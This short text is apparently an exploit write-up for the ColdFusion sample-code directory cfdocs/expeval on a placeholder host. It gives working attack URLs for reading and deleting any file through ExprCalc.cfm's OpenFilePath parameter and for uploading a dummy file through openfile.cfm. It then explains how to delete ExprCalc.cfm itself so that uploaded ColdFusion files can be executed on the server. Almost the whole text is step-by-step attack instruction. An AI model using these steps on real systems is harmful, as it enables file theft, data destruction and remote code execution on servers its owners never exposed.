To display and delete any file on the system use an URL of the following form:

http://www.victim.test/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=C:\the\target\file

To upload files to the sever first find out the location of the sample code on the server by uploading a dummy file by using http://www.victim.test/cfdocs/expeval/openfile.cfm. After uploading a dummy file it will be displayed for you. The URL will be for the form:

http://www.victim.test/cfdocs/expeval/ExprCalc.cfm?RequestTimeout=2000&OpenFilePath=C:\Inetpub\wwwroot\cfdocs\expeval\.\dummy.txt

Now replace the "dummy.txt" string by "ExprCalc.cfm" to delete that file. We can now upload and execute ColdFusion files in the server without them being deleted.
